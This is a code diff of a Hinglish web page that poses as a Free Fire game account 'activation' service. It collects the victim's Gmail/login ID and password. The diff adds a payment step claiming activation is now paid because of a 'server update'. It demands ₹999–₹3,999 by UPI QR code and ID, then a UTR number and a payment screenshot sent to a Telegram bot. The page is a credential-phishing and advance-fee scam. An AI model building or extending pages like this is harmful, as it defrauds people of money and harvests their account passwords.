@@ -67,7 +67,7 @@ margin-top:6px;color:#00eaff;
 font-weight:900;font-size:16px
 }
 
-#login,#process,#success{display:none}
+#login,#process,#success,#payment{display:none}
 
 label{
 display:block;color:#ddd;
@@ -94,6 +94,69 @@ font-weight:900;font-size:15px;cursor:pointer;
 background:linear-gradient(90deg,#8b00ff,#00bfff);
 box-shadow:0 0 15px #7200ff
 }
+
+.amount{
+text-align:center;
+font-size:25px;
+font-weight:900;
+color:#ffc43d;
+margin:5px 0 12px
+}
+
+.qr{
+display:block;
+width:210px;
+max-width:100%;
+margin:10px auto;
+border-radius:12px;
+background:#fff;
+padding:5px
+}
+
+.upi{
+text-align:center;
+margin:10px 0
+}
+
+.upi-id{
+display:inline-block;
+padding:10px 12px;
+border:1px solid #663080;
+border-radius:9px;
+background:#07030b;
+color:#00ffad;
+font-weight:bold;
+font-size:12px
+}
+
+.copy{
+width:auto;
+padding:9px 12px;
+margin:8px 0 0;
+font-size:12px;
+background:#00bfff;
+box-shadow:none
+}
+
+.pay-note{
+font-size:11px;
+color:#aaa;
+line-height:1.5;
+text-align:center;
+margin-top:8px
+}
+
+.warning{
+margin-top:12px;
+padding:10px;
+border:1px solid #ff8c00;
+border-radius:10px;
+background:#251000;
+color:#ddd;
+font-size:11px;
+line-height:1.5
+}
+.warning b{color:#ffb52e}
 
 .status{
 font-weight:bold;text-align:center;
@@ -145,13 +208,17 @@ font-size:11px;padding:8px 0 25px
 <div class="sub">FREE FIRE ACCOUNT ACTIVATION</div>
 
 <div class="info">
-<p>🛒 <b>Aapne pehle hamare store se Free Fire ID purchase ki thi.</b></p>
 
-<p>🔓 Purchased ID ko activate/open karne ke liye
-activation process start karo.</p>
+<p>🛒 <b>PHELE AAPNE HAMARE STORE SE FREE FIRE ID BUY KIYA THA.</b></p>
 
-<p>👇 Apna <b>Prime select</b> karo, phir
-Gmail/Login ID, Password aur Activation Code enter karo.</p>
+<p>⚡ <b>SERVER UPDATE:</b> Website par bahut zyada users aane ki wajah se Free Fire ID activation process ko PAID kar diya gaya hai.</p>
+
+<p>🔐 <b>ID aur Password se login karne mein koi problem nahi hai.</b></p>
+
+<p>💳 Sirf ID ko <b>ACTIVATE / OPEN</b> karne ke liye new activation payment required hai.</p>
+
+<p>🛒 Pehle jo ID buy karne ka payment kiya tha, wo activation payment mein count nahi hoga.</p>
+
 </div>
 
 
@@ -188,27 +255,95 @@ Gmail/Login ID, Password aur Activation Code enter karo.</p>
 
 <label>GMAIL / LOGIN ID</label>
 <input id="mail" placeholder="Apna Gmail / Login ID enter karo">
+
 <div class="help">
 ℹ️ Purchased ID ki Login ID yahan enter karo.
 </div>
 
 <label>PASSWORD</label>
 <input id="pass" type="password" placeholder="Apna Password enter karo">
+
 <div class="help">
 🔐 Purchased ID ka Password yahan enter karo.
 </div>
 
 <label>ACTIVATION CODE</label>
 <input id="code" placeholder="Activation Code enter karo">
+
 <div class="help">
 🔑 Approval ke baad mila Activation Code yahan enter karo.
 </div>
 
-<button onclick="activate()">
-⚡ ACTIVATE NOW →
+<button onclick="showPayment()">
+💳 CONTINUE TO PAYMENT →
 </button>
 
 </div>
+</div>
+
+
+<div class="box" id="payment">
+
+<div class="title">💳 ACTIVATION PAYMENT</div>
+
+<div class="amount" id="payAmount">₹999</div>
+
+<div class="note">
+🔓 Purchased ID ko activate/open karne ke liye
+new activation payment karo.
+</div>
+
+<img src="qr.png.jpg" class="qr" alt="Payment QR">
+
+<div class="upi">
+<div class="upi-id" id="upi">
+sunny999bot@nyes
+</div>
+
+<br>
+
+<button class="copy" onclick="copyUPI()">
+📋 COPY UPI ID
+</button>
+</div>
+
+<label>12 DIGIT UTR</label>
+
+<input
+id="utr"
+inputmode="numeric"
+maxlength="12"
+placeholder="Payment ka 12 digit UTR enter karo">
+
+<div class="help">
+📌 Payment complete hone ke baad apna 12-digit UTR yahan enter karo.
+</div>
+
+<div class="warning">
+
+<b>⚠️ PAYMENT VERIFICATION</b>
+
+<br><br>
+
+✅ Sirf real payment ka screenshot bhejo.
+<br>
+🔍 Payment manually verify kiya jayega.
+<br>
+❌ Fake / edited payment proof submit na karein.
+<br>
+📸 UTR enter karne ke baad Telegram bot par payment screenshot bhejna hoga.
+
+</div>
+
+<button onclick="verifyPayment()">
+🤖 VERIFY PAYMENT ON TELEGRAM →
+</button>
+
+<div class="pay-note">
+Payment verify hone ke baad admin approval karega.
+Approval ke baad activation process continue hoga.
+</div>
+
 </div>
 
 
@@ -227,7 +362,7 @@ Gmail/Login ID, Password aur Activation Code enter karo.</p>
 <div class="status" id="pct">0%</div>
 
 <div class="note" id="processNote">
-Activation server se connection establish ho raha hai...
+Payment verification ke baad activation process continue hoga...
 </div>
 
 </div>
@@ -262,13 +397,15 @@ Aapki purchased ID activation ke liye ready hai.
 
 <p>2️⃣ <b>Login Details:</b> Gmail/Login ID aur Password enter karo.</p>
 
-<p>3️⃣ <b>Activation Code:</b> Apna Activation Code enter karo.</p>
+<p>3️⃣ <b>Activation Code:</b> Approval ke baad mila code enter karo.</p>
 
-<p>4️⃣ <b>Activate:</b> ACTIVATE NOW button par click karo.</p>
+<p>4️⃣ <b>Payment:</b> Selected Prime ka activation payment karo.</p>
 
-<p>5️⃣ <b>Processing:</b> Server activation process start karega.</p>
+<p>5️⃣ <b>UTR:</b> Payment ke baad 12-digit UTR enter karo.</p>
 
-<p>6️⃣ <b>Login Now:</b> Activation ready hone ke baad login process continue karo.</p>
+<p>6️⃣ <b>Telegram:</b> Payment screenshot <b>@IDActivationBot</b> par bhejo.</p>
+
+<p>7️⃣ <b>Approval:</b> Payment verification ke baad activation continue hoga.</p>
 
 </div>
 
@@ -279,7 +416,7 @@ Aapki purchased ID activation ke liye ready hai.
 
 <div class="note">
 Activation process mein problem aaye to
-SUNNY 999 BOT support se contact karo.
+ID Activation Bot support se contact karo.
 </div>
 
 <button onclick="openSupport()">
@@ -300,6 +437,13 @@ SUNNY 999 BOT support se contact karo.
 
 let prime=0;
 
+const prices={
+5:"₹999",
+6:"₹1,299",
+7:"₹1,999",
+8:"₹3,999"
+};
+
 function choose(p,e){
 
 prime=p;
@@ -314,68 +458,71 @@ document.getElementById("login").style.display="block";
 }
 
 
-function activate(){
+function showPayment(){
 
 let mail=document.getElementById("mail").value.trim();
 let pass=document.getElementById("pass").value.trim();
 let code=document.getElementById("code").value.trim();
+
+if(!prime){
+alert("Pehle Prime select karo.");
+return;
+}
 
 if(!mail || !pass || !code){
 alert("Gmail / Password / Activation Code enter karo.");
 return;
 }
 
-document.getElementById("select").style.display="none";
-document.getElementById("process").style.display="block";
+document.getElementById("payAmount").innerText=prices[prime];
 
-let n=0;
+document.getElementById("payment").style.display="block";
 
-let bar=document.getElementById("bar");
-let pct=document.getElementById("pct");
-let st=document.getElementById("st");
-let note=document.getElementById("processNote");
-
-let t=setInterval(()=>{
-
-n+=5;
-
-if(n<35){
-st.innerText="⏳ PROCESSING...";
-note.innerText="Activation request process ho rahi hai...";
-}
-
-else if(n<65){
-st.innerText="🔄 CONNECTING TO SERVER...";
-note.innerText="Server connection establish ho raha hai...";
-}
-
-else if(n<90){
-st.innerText="🟢 SERVER LOADING...";
-note.innerText="Activation server response load ho raha hai...";
-}
-
-else{
-st.innerText="⚡ FINALIZING ACTIVATION...";
-note.innerText="Activation process complete ho raha hai...";
-}
-
-bar.style.width=n+"%";
-pct.innerText=n+"%";
-
-if(n>=99){
-
-clearInterval(t);
-
-setTimeout(()=>{
-
-document.getElementById("process").style.display="none";
-document.getElementById("success").style.display="block";
-
-},900);
+document.getElementById("payment").scrollIntoView({
+behavior:"smooth",
+block:"start"
+});
 
 }
 
-},220);
+
+function copyUPI(){
+
+navigator.clipboard.writeText("sunny999bot@nyes");
+
+alert("UPI ID COPIED!");
+
+}
+
+
+function verifyPayment(){
+
+let utr=document.getElementById("utr").value.trim();
+
+if(!prime){
+alert("Pehle Prime select karo.");
+return;
+}
+
+if(!utr || !/^[0-9]{12}$/.test(utr)){
+alert("Valid 12 digit UTR enter karo.");
+return;
+}
+
+let mail=document.getElementById("mail").value.trim();
+let code=document.getElementById("code").value.trim();
+
+let message=
+"Payment Verification%0A"+
+"Prime: "+prime+"%0A"+
+"Amount: "+prices[prime]+"%0A"+
+"UTR: "+utr+"%0A"+
+"Activation Code: "+encodeURIComponent(code);
+
+window.open(
+"https://t.me/IDActivationBot?text="+message,
+"_blank"
+);
 
 }
 
@@ -394,7 +541,7 @@ alert(
 function openSupport(){
 
 window.open(
-"https://t.me/FFAccountXBot",
+"https://t.me/IDActivationBot",
 "_blank"
 );
 
